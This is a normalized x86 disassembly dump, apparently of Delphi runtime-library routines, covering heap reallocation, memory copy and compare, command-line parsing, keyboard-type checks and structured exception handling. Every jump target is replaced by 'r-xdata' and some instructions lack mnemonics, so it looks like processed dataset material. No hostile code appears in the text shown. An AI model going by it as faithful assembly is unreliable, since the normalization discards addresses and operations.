mov edx [ eax + 0x8 ]
add ebx edx
call sub_401ba0
sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405cd8
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405cd8
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405cd8
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405cd8
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4028f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4045b8
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029e4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f6c
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40125c
mov ecx eax
mov edx esp
mov eax ebx
call sub_40405c
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4028f8
mov edi eax
test esi esi
je r-xdata
sub_402a84
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402ad8
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_402b30
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402b4c
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402bd0
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c40
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c60
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d40
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402d80
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e33 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e33 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_40306c
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_40309c
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_403198
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403240
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_403298
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_40499c
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032b8
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4055c0
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4032e8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_40337c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403373
lea eax [ ebp - 0x8 ]
call sub_4055a8
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032b8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4055c0
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_40337c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033c0
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403448
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403400
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403430
push eax
push ecx
mov eax [ eax ]
call sub_403400
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f60
call [ rw-data ]
sub_403478
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403400
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034a0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4034f0
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403540
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403569
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4035d4
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403610
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403624
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403638
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403658
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403638
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036bc
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403160
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405cd8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403624
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4035d4
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4037e8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403160
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4035d4
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405cd8
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403610
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402bd0
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039a8
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403f60
sub_4039d0
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405cd8
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403234
call sub_4035b8
sub_403a24
call sub_405cd8
mov edx [ eax ]
